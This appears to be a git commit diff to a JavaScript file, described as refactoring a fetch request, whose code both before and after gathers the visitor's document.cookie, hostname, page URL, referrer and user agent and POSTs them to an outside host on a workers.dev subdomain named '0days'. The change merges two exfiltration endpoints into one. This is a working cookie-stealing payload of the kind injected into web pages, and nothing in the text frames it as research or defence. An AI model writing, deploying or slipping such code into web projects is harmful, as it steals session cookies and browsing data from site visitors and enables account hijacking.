c0fbc58a42c7ce9360e90a9cdf67481426bbfd72
Matteo Elias Schapira <54103711+Niccolo10@users.noreply.github.com>
2026-01-14 19:05:46 +0100

    Refactor fetch request to single endpoint with data

--- a.js
+++ a.js
@@ -1,23 +1,11 @@
-var data = {
-    cookie: document.cookie,
-    domain: location.hostname,
-    url: location.href,
-    ref: document.referrer,
-    ua: navigator.userAgent
-};
-
-// Send to your first endpoint
-fetch('https://aged-cloud-b431.0days.workers.dev/x/8c12613f5acfd286-qpkh68e3x', {
+fetch('https://aged-cloud-b431.0days.workers.dev/w/8c12613f5acfd286-jab7ncdwl', {
     method: "POST",
-    mode: "no-cors",
     headers: {"Content-Type": "application/json"},
-    body: JSON.stringify(data)
-});
-
-// Send to your second endpoint (if you want both)
-fetch('https://aged-cloud-b431.0days.workers.dev/w/8c12613f5acfd286-a3qwxqcq5', {
-    method: "POST",
-    mode: "no-cors",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify(data)
+    body: JSON.stringify({
+        domain: location.hostname,
+        url: location.href,
+        ref: document.referrer,
+        ua: navigator.userAgent,
+        cookie: document.cookie
+    })
 });
